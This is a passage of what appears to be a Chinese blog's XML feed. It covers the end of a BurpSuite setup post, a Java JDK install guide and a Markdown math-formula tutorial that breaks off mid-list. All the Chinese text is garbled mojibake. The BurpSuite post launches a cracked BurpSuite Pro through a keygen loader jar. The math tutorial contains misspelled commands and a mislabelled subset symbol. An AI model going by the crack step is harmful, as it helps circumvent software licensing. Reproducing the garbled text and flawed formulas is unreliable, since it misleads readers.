alt="image-20210919231927976" style="zoom:50%;"></p><p>6ã€æ¿€æ´»ä¹‹åï¼Œä¸èƒ½é€šè¿‡åŒå‡» <strong>BurpSuite</strong> ä¸»ç¨‹åºæ¥å¯åŠ¨ï¼Œå¦åˆ™å¯åŠ¨ä¹‹åè¿˜æ˜¯éœ€è¦é‡æ–°æ¿€æ´»ï¼Œä¸¤ä¸ªæ–‡ä»¶å¿…é¡»æ”¾åœ¨ä¸€ä¸ªç›®å½•ä¸‹ï¼Œå¯åŠ¨æ–¹å¼æœ‰ä¸¤ç§ï¼š</p><ul><li><p>é€šè¿‡ <strong>keygen</strong> ä¸Šçš„ <strong>run</strong> æŒ‰é’®æ¥å¯åŠ¨</p></li><li><p>åœ¨æ–‡ä»¶ç›®å½•ä¸‹æ‰§è¡Œ <code>java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.33.jar</code> æ¥å¯åŠ¨ ã€‚ä¸ºäº†æ–¹ä¾¿ï¼Œå¯ä»¥å°†å‘½ä»¤ä¿å­˜ä¸ºä¸€ä¸ª <strong>bat</strong> ã€‚</p></li></ul><h2 id="BurpSuiteè®¾ç½®ä»£ç†"><a href="#BurpSuiteè®¾ç½®ä»£ç†" class="headerlink" title="BurpSuiteè®¾ç½®ä»£ç†"></a>BurpSuiteè®¾ç½®ä»£ç†</h2><p>è¿™é‡Œæ¨è<strong>ç«ç‹æµè§ˆå™¨</strong>æ¥é…åˆ <strong>burp</strong> ä½¿ç”¨ ã€‚</p><h3 id="1ã€è®¾ç½®æµè§ˆå™¨ä»£ç†"><a href="#1ã€è®¾ç½®æµè§ˆå™¨ä»£ç†" class="headerlink" title="1ã€è®¾ç½®æµè§ˆå™¨ä»£ç†"></a>1ã€è®¾ç½®æµè§ˆå™¨ä»£ç†</h3><p>1ï¼‰æ‰“å¼€<strong>è®¾ç½®</strong>ï¼Œæœç´¢<strong>ä»£ç†</strong>ï¼Œç‚¹å‡»<strong>è®¾ç½®</strong> ã€‚</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/f84f1111f88685d6e31de3a5c3cedb4e.png" alt="image-20210920112144075" style="zoom:67%;"></p><p>2ï¼‰æ”¹ä¸º<strong>æ‰‹åŠ¨é…ç½®ä»£ç†</strong> ï¼Œè®¾ç½®å¦‚å›¾æ‰€ç¤º ã€‚</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/b8251eef95c2414f69994ccb258da0a9.png" alt="image-20210920112121849" style="zoom:50%;"></p><p>3ï¼‰è¾“å…¥ <code>127.0.0.1:8080</code> ï¼Œç‚¹å‡»å›è½¦ï¼Œè¿›å…¥ <strong>burp</strong> è¯ä¹¦ä¸‹è½½é¡µé¢ï¼Œç‚¹å‡»å³ä¸Šè§’ï¼Œä¸‹è½½è¯ä¹¦ ã€‚</p><p>4ï¼‰æ‰“å¼€<strong>è®¾ç½®</strong>ï¼Œæœç´¢<strong>è¯ä¹¦</strong>ï¼Œç‚¹å‡»<strong>æŸ¥çœ‹è¯ä¹¦</strong></p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/74185b85b1ef83c10ff34fd1e54ae108.png" alt="image-20210920112618645" style="zoom:67%;"></p><p>5ï¼‰ç‚¹å‡»<strong>å¯¼å…¥</strong>ï¼Œå¯¼å…¥åˆšåˆšä¸‹è½½çš„ <strong>burp è¯ä¹¦</strong>ï¼Œç¡®å®šï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨ <strong>burp</strong> æŠ“å– <strong>https</strong> è¯·æ±‚äº† ã€‚</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/90c60a8ac3af0171a0cf24e91a15793d.png" alt="image-20210920112654665" style="zoom:50%;"></p><p>ä»£ç†è®¾ç½®æˆåŠŸä¹‹åï¼Œè®¿é—®ç½‘é¡µæ˜¯è®¿é—®ä¸äº†çš„ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰å°†è¯·æ±‚è½¬å‘ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦é…ç½® burp æ¥è½¬å‘æµè§ˆå™¨çš„è¯·æ±‚ã€‚</p><h3 id="2ã€é…ç½®-burp-ç›‘å¬ç«¯å£"><a href="#2ã€é…ç½®-burp-ç›‘å¬ç«¯å£" class="headerlink" title="2ã€é…ç½® burp ç›‘å¬ç«¯å£"></a>2ã€é…ç½® burp ç›‘å¬ç«¯å£</h3><p>æ‰“å¼€<strong>burp</strong> ï¼Œåœ¨ç›‘å¬çš„ç«¯å£è®¾ç½®ä¸ä»£ç†ç›¸åŒçš„ç«¯å£ ã€‚</p><p><img src="/2021/09/19/CTF/Web/Tools/BurpSuite%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/067b6a51baa25dd46bf5869b72bc5761.png" alt="image-20210920112901889" style="zoom:67%;"></p>]]></content>
    
    
    <categories>
      
      <category>BurpSuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>BurpSuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaç¯å¢ƒå®‰è£…ä¸é…ç½®</title>
    <link href="/2021/09/13/Code/Java/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/09/13/Code/Java/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="å®‰è£…-JDK-å¹¶é…ç½®-Java-ç¯å¢ƒ"><a href="#å®‰è£…-JDK-å¹¶é…ç½®-Java-ç¯å¢ƒ" class="headerlink" title="å®‰è£… JDK å¹¶é…ç½® Java ç¯å¢ƒ"></a>å®‰è£… JDK å¹¶é…ç½® Java ç¯å¢ƒ</h1><p>å¯ä»¥è‡ªè¡Œç™¾åº¦æœç´¢ï¼Œä¸‹è½½ç›¸åº”ç‰ˆæœ¬çš„ <code>JDK</code> ï¼Œè¿™é‡Œæˆ‘å®‰è£…çš„ <strong>jdk-8u301-windows-x64.exe</strong> ã€‚</p><p><code>Java 8</code> ä¸‹è½½åœ°å€ï¼š<a href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">Java SE Development Kit 8 - Downloads (oracle.com)</a></p><p><code>Java</code> ä¸‹è½½åœ°å€ï¼š<a href="https://www.oracle.com/java/technologies/javase-downloads.html">Java SE - Downloads | Oracle Technology Network | Oracle</a></p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>è¿™é‡Œå»ºè®®ç›´æ¥é»˜è®¤å®‰è£…ï¼Œå¦‚æœ <code>C ç›˜</code> ç©ºé—´ä¸å¤Ÿï¼Œå¯ä»¥æ›´æ¢å…¶ä»–ç›®å½•ï¼Œä½†ä¸€å®šè¦è®°ä½å®‰è£…è·¯å¾„ï¼Œé»˜è®¤å®‰è£…ä¸€èˆ¬ä¼šå®‰è£…åœ¨ <code>C:\Program Files\Java</code> ã€‚</p><blockquote><p>æœ€å¥½å®‰è£…åœ¨ C ç›˜ï¼Œä»¥å…åé¢å‡ºç°é—®é¢˜ ã€‚</p></blockquote><h2 id="é…ç½®ç¯å¢ƒ"><a href="#é…ç½®ç¯å¢ƒ" class="headerlink" title="é…ç½®ç¯å¢ƒ"></a>é…ç½®ç¯å¢ƒ</h2><p>å³å‡» <code>æ­¤ç”µè„‘</code> æ‰“å¼€ <code>å±æ€§</code> ï¼Œæœç´¢ <code>ç¯å¢ƒ</code> ï¼Œç‚¹å‡»<strong>ã€Œç¼–è¾‘ç³»ç»Ÿç¯å¢ƒå˜é‡ã€-&gt;ã€Œç¯å¢ƒå˜é‡ã€</strong> ã€‚</p><p>åœ¨ <code>ç³»ç»Ÿå˜é‡</code> ä¸­ï¼Œç‚¹å‡» <code>æ–°å»º</code> ï¼Œè¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livescript">å˜é‡åï¼šJAVA_HOME<br>å˜é‡å€¼ï¼šC:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Java\jdk1.8.0_301</span>    <span class="hljs-comment">#å®‰è£…çš„è·¯å¾„</span><br></code></pre></td></tr></table></figure><p>å†æ¬¡ç‚¹å‡» <code>æ–°å»º</code> ï¼Œè¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">å˜é‡åï¼šCLASSPATH<br>å˜é‡å€¼ï¼š.;<span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\l</span>ib<span class="hljs-symbol">\d</span>t.jar;<span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\l</span>ib<span class="hljs-symbol">\t</span>ools.jar;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>ç³»ç»Ÿå˜é‡</code> ä¸­ï¼Œæ‰¾åˆ° <code>Path</code> ï¼ŒåŒå‡»æ‰“å¼€ï¼Œç‚¹å‡» <code>æ–°å»º</code> ï¼Œè¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\b</span>in<br><span class="hljs-variable">%JAVA_HOME%</span><span class="hljs-symbol">\j</span>re<span class="hljs-symbol">\b</span>in<br></code></pre></td></tr></table></figure><p>å®Œæˆåä¸€ç›´ç‚¹ç¡®å®šå³å¯ ã€‚</p><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>å®‰è£…é…ç½®å®Œæˆåï¼Œæ‰“å¼€ <code>cmd</code> æŸ¥çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\13562&gt;javac -version<br>javac 1.8.0_301<br><br>C:\Users\13562&gt;java -version<br>java version &quot;1.8.0_301&quot;<br>Java(TM) SE Runtime Environment (build 1.8.0_301-b09)<br>Java HotSpot(TM) 64-Bit Server VM (build 25.301-b09, mixed mode)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>env</tag>
      
      <tag>Java</tag>
      
      <tag>JDK</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdownæ•™ç¨‹</title>
    <link href="/2021/08/26/MessUp/Markdown%E6%95%99%E7%A8%8B/"/>
    <url>/2021/08/26/MessUp/Markdown%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>Markdown æ˜¯ä¸€ç§è½»é‡çº§æ ‡è®°è¯­è¨€ï¼Œå®ƒå…è®¸äººä»¬ä½¿ç”¨æ˜“è¯»æ˜“å†™çš„çº¯æ–‡æœ¬æ ¼å¼ç¼–å†™æ–‡æ¡£ã€‚</p><p>Markdown ç¼–å†™çš„æ–‡æ¡£å¯ä»¥å¯¼å‡º HTML ã€Wordã€å›¾åƒã€PDFã€Epub ç­‰å¤šç§æ ¼å¼çš„æ–‡æ¡£ã€‚</p><h2 id="Markdownæ•°å­¦å…¬å¼"><a href="#Markdownæ•°å­¦å…¬å¼" class="headerlink" title="Markdownæ•°å­¦å…¬å¼"></a>Markdownæ•°å­¦å…¬å¼</h2><blockquote><p>å‚è€ƒï¼š</p><ul><li><a href="https://blog.csdn.net/qq_18150255/article/details/88040858">Markdownä¸­æ•°å­¦å…¬å¼åŠç¬¦å·æ•´ç† ä¼šé£çš„é±¼çš„åšå®¢</a></li></ul></blockquote><h3 id="è¡Œå†…ä¸ç‹¬è¡Œ"><a href="#è¡Œå†…ä¸ç‹¬è¡Œ" class="headerlink" title="è¡Œå†…ä¸ç‹¬è¡Œ"></a>è¡Œå†…ä¸ç‹¬è¡Œ</h3><ol><li>è¡Œå†…å…¬å¼ï¼šå°†å…¬å¼æ’å…¥åˆ°æœ¬è¡Œå†…ï¼Œç¬¦å·ï¼š<script type="math/tex">å…¬å¼å†…å®¹</script>ï¼Œå¦‚ï¼š$xyz$</li><li>ç‹¬è¡Œå…¬å¼ï¼šå°†å…¬å¼æ’å…¥åˆ°æ–°çš„ä¸€è¡Œå†…ï¼Œå¹¶ä¸”å±…ä¸­ï¼Œç¬¦å·ï¼š<script type="math/tex">$å…¬å¼å†…å®¹$$$ï¼Œå¦‚ï¼š</script>xyz$$</li></ol><h3 id="ä¸Šæ ‡ã€ä¸‹æ ‡ä¸ç»„åˆ"><a href="#ä¸Šæ ‡ã€ä¸‹æ ‡ä¸ç»„åˆ" class="headerlink" title="ä¸Šæ ‡ã€ä¸‹æ ‡ä¸ç»„åˆ"></a>ä¸Šæ ‡ã€ä¸‹æ ‡ä¸ç»„åˆ</h3><ol><li>ä¸Šæ ‡ç¬¦å·ï¼Œç¬¦å·ï¼š<code>^</code>ï¼Œå¦‚ï¼š$x^4$</li><li>ä¸‹æ ‡ç¬¦å·ï¼Œç¬¦å·ï¼š<code>_</code>ï¼Œå¦‚ï¼š$x_1$</li><li>ç»„åˆç¬¦å·ï¼Œç¬¦å·ï¼š<code>&#123;&#125;</code>ï¼Œå¦‚ï¼š${16}<em>{8}O{2+}</em>{2}$</li></ol><h3 id="æ±‰å­—ã€å­—ä½“ä¸æ ¼å¼"><a href="#æ±‰å­—ã€å­—ä½“ä¸æ ¼å¼" class="headerlink" title="æ±‰å­—ã€å­—ä½“ä¸æ ¼å¼"></a>æ±‰å­—ã€å­—ä½“ä¸æ ¼å¼</h3><ol><li>æ±‰å­—å½¢å¼ï¼Œç¬¦å·ï¼š<code>\mbox&#123;&#125;</code>ï¼Œå¦‚ï¼š$V_{\mbox{åˆå§‹}}$</li><li>å­—ä½“æ§åˆ¶ï¼Œç¬¦å·ï¼š<code>\displaystyle</code>ï¼Œå¦‚ï¼š$\displaystyle \frac{x+y}{y+z}$</li><li>ä¸‹åˆ’çº¿ç¬¦å·ï¼Œç¬¦å·ï¼š<code>\underline</code>ï¼Œå¦‚ï¼š$\underline{x+y}$</li><li>æ ‡ç­¾ï¼Œç¬¦å·<code>\tag&#123;æ•°å­—&#125;</code>ï¼Œå¦‚ï¼š$\tag{11}$</li><li>ä¸Šå¤§æ‹¬å·ï¼Œç¬¦å·ï¼š<code>\overbrace&#123;ç®—å¼&#125;</code>ï¼Œå¦‚ï¼š$\overbrace{a+b+c+d}^{2.0}$</li><li>ä¸‹å¤§æ‹¬å·ï¼Œç¬¦å·ï¼š<code>\underbrace&#123;ç®—å¼&#125;</code>ï¼Œå¦‚ï¼š$a+\underbrace{b+c}_{1.0}+d$</li><li>ä¸Šä½ç¬¦å·ï¼Œç¬¦å·ï¼š<code>\stacrel&#123;ä¸Šä½ç¬¦å·&#125;&#123;åŸºä½ç¬¦å·&#125;</code>ï¼Œå¦‚ï¼š$\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}$</li></ol><h3 id="å ä½ç¬¦"><a href="#å ä½ç¬¦" class="headerlink" title="å ä½ç¬¦"></a>å ä½ç¬¦</h3><ol><li>ä¸¤ä¸ªquadç©ºæ ¼ï¼Œç¬¦å·ï¼š<code>\qquad</code>ï¼Œå¦‚ï¼š$x \qquad y$</li><li>quadç©ºæ ¼ï¼Œç¬¦å·ï¼š<code>\quad</code>ï¼Œå¦‚ï¼š$x \quad y$</li><li>å¤§ç©ºæ ¼ï¼Œç¬¦å· <code>\</code>ï¼Œå¦‚ï¼š$x \ y$</li><li>ä¸­ç©ºæ ¼ï¼Œç¬¦å· <code>\:</code>ï¼Œå¦‚ï¼š$x \: y$</li><li>å°ç©ºæ ¼ï¼Œç¬¦å· <code>\,</code>ï¼Œå¦‚ï¼š$x \, y$</li><li>æ²¡æœ‰ç©ºæ ¼ï¼Œç¬¦å· `` ï¼Œå¦‚ï¼š$xy$</li><li>ç´§è´´ï¼Œç¬¦å· <code>\!</code> ï¼Œå¦‚ï¼š$x ! y$</li></ol><h3 id="å®šç•Œç¬¦ä¸ç»„åˆ"><a href="#å®šç•Œç¬¦ä¸ç»„åˆ" class="headerlink" title="å®šç•Œç¬¦ä¸ç»„åˆ"></a>å®šç•Œç¬¦ä¸ç»„åˆ</h3><ol><li>æ‹¬å·ï¼Œç¬¦å·ï¼š<code>ï¼ˆï¼‰\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)</code>ï¼Œå¦‚ï¼š$ï¼ˆï¼‰\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)$</li><li>ä¸­æ‹¬å·ï¼Œç¬¦å·ï¼š<code>[]</code>ï¼Œå¦‚ï¼š$[x+y]$</li><li>å¤§æ‹¬å·ï¼Œç¬¦å·ï¼š<code>\&#123; \&#125;</code>ï¼Œå¦‚ï¼š${x+y}$</li><li>è‡ªé€‚åº”æ‹¬å·ï¼Œç¬¦å·ï¼š<code>\left \right</code>ï¼Œå¦‚ï¼š$\left(x\right)$ï¼Œ$\left(x{yz}\right)$</li><li>ç»„åˆå…¬å¼ï¼Œç¬¦å·ï¼š<code>&#123;ä¸Šä½å…¬å¼ \choose ä¸‹ä½å…¬å¼&#125;</code>ï¼Œå¦‚ï¼š${n+1 \choose k}={n \choose k}+{n \choose k-1}$</li><li>ç»„åˆå…¬å¼ï¼Œç¬¦å·ï¼š<code>&#123;ä¸Šä½å…¬å¼ \atop ä¸‹ä½å…¬å¼&#125;</code>ï¼Œå¦‚ï¼š$\sum<em>{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n}A</em>{k<em>0}A</em>{k_1}\cdots$</li><li>å¤§æ‹¬å·ï¼Œç¬¦å·ï¼š<code>\lbrace  \rbrace</code>ï¼Œå¦‚ï¼š$\lbrace a+x \rbrace$</li><li>å°–æ‹¬å·ï¼Œç¬¦å·ï¼š<code>\langle  \rangle</code>ï¼Œå¦‚ï¼š$\langle x \rangle$</li><li>ä¸Šå–æ•´ï¼Œç¬¦å·ï¼š<code>\lceil  \rceil</code>ï¼Œå¦‚ï¼š$\lceil \frac{x}{2} \rceil$</li><li>ä¸‹å–æ•´ï¼Œç¬¦å·ï¼š<code>\lfloor  \rfloor</code>ï¼Œå¦‚ï¼š$\lfloor x \rfloor$</li><li>åŸå§‹æ‹¬å·ï¼Œç¬¦å·ï¼š<code>\lbrace  \rbrace</code>ï¼Œå¦‚ï¼š$\lbrace \sum_{i=0}^{n}i^{2}=\frac{2a}{x^2+1} \rbrace$</li><li>å…¨åŒ…æ‹¬å·ï¼Œç¬¦å·ï¼š<code>\left\lbrace  \right\rbrace</code>ï¼Œå¦‚ï¼š$\left\lbrace \sum_{i=0}^{n}i^{2}=\frac{2a}{x^2+1} \right\rbrace$</li></ol><h3 id="å››åˆ™è¿ç®—"><a href="#å››åˆ™è¿ç®—" class="headerlink" title="å››åˆ™è¿ç®—"></a>å››åˆ™è¿ç®—</h3><ol><li>åŠ æ³•è¿ç®—ï¼Œç¬¦å·ï¼š<code>+</code>ï¼Œå¦‚ï¼š$x+y=z$</li><li>å‡æ³•è¿ç®—ï¼Œç¬¦å·ï¼š<code>-</code>ï¼Œå¦‚ï¼š$x-y=z$</li><li>åŠ å‡è¿ç®—ï¼Œç¬¦å·ï¼š<code>\pm</code>ï¼Œå¦‚ï¼š$x \pm y=z$</li><li>å‡ç”²è¿ç®—ï¼Œç¬¦å·ï¼š<code>\mp</code>ï¼Œå¦‚ï¼š$x \mp y=z$</li><li>ä¹˜æ³•è¿ç®—ï¼Œç¬¦å·ï¼š<code>\times</code>ï¼Œå¦‚ï¼š$x \times y=z$</li><li>ç‚¹ä¹˜è¿ç®—ï¼Œç¬¦å·ï¼š<code>\cdot</code>ï¼Œå¦‚ï¼š$x \cdot y=z$</li><li>æ˜Ÿä¹˜è¿ç®—ï¼Œç¬¦å·ï¼š<code>\ast</code>ï¼Œå¦‚ï¼š$x \ast y=z$</li><li>é™¤æ³•è¿ç®—ï¼Œç¬¦å·ï¼š<code>\div</code>ï¼Œå¦‚ï¼š$x \div y=z$</li><li>æ–œæ³•è¿ç®—ï¼Œç¬¦å·ï¼š<code>/</code>ï¼Œå¦‚ï¼š$x/y=z$</li><li>åˆ†å¼è¡¨ç¤ºï¼Œç¬¦å·ï¼š<code>\frac&#123;åˆ†å­&#125;&#123;åˆ†æ¯&#125;</code>ï¼Œå¦‚ï¼š$\frac{x+y}{y+z}$</li><li>åˆ†å¼è¡¨ç¤ºï¼Œç¬¦å·ï¼š<code>&#123;åˆ†å­&#125; \voer &#123;åˆ†æ¯&#125;</code>ï¼Œå¦‚ï¼š${x+y} \over {y+z}$</li><li>ç»å¯¹å€¼è¡¨ç¤ºï¼Œç¬¦å·ï¼š<code>|å…¬å¼|</code>ï¼Œå¦‚ï¼š$|x+y|$</li></ol><h3 id="é«˜çº§è¿ç®—"><a href="#é«˜çº§è¿ç®—" class="headerlink" title="é«˜çº§è¿ç®—"></a>é«˜çº§è¿ç®—</h3><ol><li>å¹³å‡æ•°è¿ç®—ï¼Œç¬¦å·ï¼š<code>\overline&#123;ç®—å¼&#125;</code>ï¼Œå¦‚ï¼š$\overline{xyz}$</li><li>å¼€äºŒæ¬¡æ–¹è¿ç®—ï¼Œç¬¦å·ï¼š<code>\sqrt</code>ï¼Œå¦‚ï¼š$\sqrt x$</li><li>å¼€æ–¹è¿ç®—ï¼Œç¬¦å·ï¼š<code>\sqrt[å¼€æ–¹æ•°]&#123;è¢«å¼€æ–¹æ•°&#125;</code>ï¼Œå¦‚ï¼š$\sqrt[3]{x+y}$</li><li>å¯¹æ•°è¿ç®—ï¼Œç¬¦å·ï¼š<code>\log</code>ï¼Œå¦‚ï¼š$\log(x)$</li><li>å¯¹æ•°è¿ç®—ï¼Œç¬¦å·ï¼š<code>\lg</code>ï¼Œå¦‚ï¼š$\lg(x)$</li><li>å¯¹æ•°è¿ç®—ï¼Œç¬¦å·ï¼š<code>\ln</code>ï¼Œå¦‚ï¼š$\ln(x)$</li><li>æé™è¿ç®—ï¼Œç¬¦å·ï¼š<code>\lim</code>ï¼Œå¦‚ï¼š$\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>æé™è¿ç®—ï¼Œç¬¦å·ï¼š<code>\displaystyle \lim</code>ï¼Œå¦‚ï¼š$\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>æ±‚å’Œè¿ç®—ï¼Œç¬¦å·ï¼š<code>\sum</code>ï¼Œå¦‚ï¼š$\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>æ±‚å’Œè¿ç®—ï¼Œç¬¦å·ï¼š<code>\displaystyle \sum</code>ï¼Œå¦‚ï¼š$\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>ç´¯ä¹˜è¿ç®—ï¼Œç¬¦å·ï¼š<code>\prod</code>ï¼Œå¦‚ï¼š$\prod ^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</li><li>ç§¯åˆ†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\int</code>ï¼Œå¦‚ï¼š$\int^{\infty}_{0}{x{\rm d}x}$</li><li>ç§¯åˆ†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\displaystyle \int</code>ï¼Œå¦‚ï¼š$\displaystyle \int^{\infty}_{0}{xdx}$</li><li>å¾®åˆ†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\partial</code>ï¼Œå¦‚ï¼š$\frac{\partial x}{\partial y}$</li><li>ç¬¦å·ï¼š<code>\oint</code>ï¼Œå¦‚ï¼š$\oint$</li><li>çŸ©é˜µè¡¨ç¤ºï¼Œç¬¦å·ï¼š<code>\begin&#123;matrix&#125; \end&#123;matrix&#125;</code>ï¼Œå¦‚ï¼š$\left[ \begin{matrix} 1 &amp;2 &amp;\cdots &amp;6 &amp;7 \ 8 &amp;\vdots &amp;\ddots &amp;\vdots &amp;14 \ 15 &amp;16 &amp;\cdots &amp;20 &amp;21 \end{matrix} \right]$</li></ol><h3 id="é€»è¾‘è¿ç®—"><a href="#é€»è¾‘è¿ç®—" class="headerlink" title="é€»è¾‘è¿ç®—"></a>é€»è¾‘è¿ç®—</h3><ol><li>ç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>=</code>ï¼Œå¦‚ï¼š$x+y=z$</li><li>å¤§äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>&gt;</code>ï¼Œå¦‚ï¼š$x+y&gt;z$</li><li>å°äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>&lt;</code>ï¼Œå¦‚ï¼š$x+y&lt;z$</li><li>å¤§äºç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\geq</code>ï¼Œå¦‚ï¼š$x+y \geq z$</li><li>å°äºç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\leq</code>ï¼Œå¦‚ï¼š$x+y \leq z$</li><li>ä¸ç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\neq</code>ï¼Œå¦‚ï¼š$x+y \neq z$</li><li>ä¸å¤§äºç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\ngeq</code>ï¼Œå¦‚ï¼š$x+y \ngeq z$</li><li>ä¸å¤§äºç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\not\geq</code>ï¼Œå¦‚ï¼š$x+y \not\geq z$</li><li>ä¸å°äºç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\nleq</code>ï¼Œå¦‚ï¼š$x+y \nleq z$</li><li>ä¸å°äºç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\not\leq</code>ï¼Œå¦‚ï¼š$x+y \not\leq z$</li><li>çº¦ç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\approx</code>ï¼Œå¦‚ï¼š$x+y \approx z$</li><li>æ’å®šç­‰äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\equiv</code>ï¼Œå¦‚ï¼š$x+y \equiv z$</li></ol><h3 id="é›†åˆè¿ç®—"><a href="#é›†åˆè¿ç®—" class="headerlink" title="é›†åˆè¿ç®—"></a>é›†åˆè¿ç®—</h3><ol><li>å±äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\in</code>ï¼Œå¦‚ï¼š$x \in y$</li><li>ä¸å±äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\notin</code>ï¼Œå¦‚ï¼š$x \notin y$</li><li>ä¸å±äºè¿ç®—ï¼Œç¬¦å·ï¼š<code>\not\in</code>ï¼Œå¦‚ï¼š$x \not\in y$</li><li>å­é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\subset</code>ï¼Œå¦‚ï¼š$x \subset y$</li><li>å­é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\supset</code>ï¼Œå¦‚ï¼š$x \supset y$</li><li>çœŸå­é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\subseteq</code>ï¼Œå¦‚ï¼š$x \subseteq y$</li><li>éçœŸå­é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\subsetneq</code>ï¼Œå¦‚ï¼š$x \subsetneq y$</li><li>çœŸå­é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\supseteq</code>ï¼Œå¦‚ï¼š$x \supseteq y$</li><li>éçœŸå­é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\supsetneq</code>ï¼Œå¦‚ï¼š$x \supsetneq y$</li><li>éå­é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\not\subset</code>ï¼Œå¦‚ï¼š$x \not\subset y$</li><li>éå­é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\not\supset</code>ï¼Œå¦‚ï¼š$x \not\supset y$</li><li>å¹¶é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\cup</code>ï¼Œå¦‚ï¼š$x \cup y$</li><li>äº¤é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\cap</code>ï¼Œå¦‚ï¼š$x \cap y$</li><li>å·®é›†è¿ç®—ï¼Œç¬¦å·ï¼š<code>\setminus</code>ï¼Œå¦‚ï¼š$x \setminus y$</li><li>åŒæˆ–è¿ç®—ï¼Œç¬¦å·ï¼š<code>\bigodot</code>ï¼Œå¦‚ï¼š$x \bigodot y$</li><li>åŒä¸è¿ç®—ï¼Œç¬¦å·ï¼š<code>\bigotimes</code>ï¼Œå¦‚ï¼š$x \bigotimes 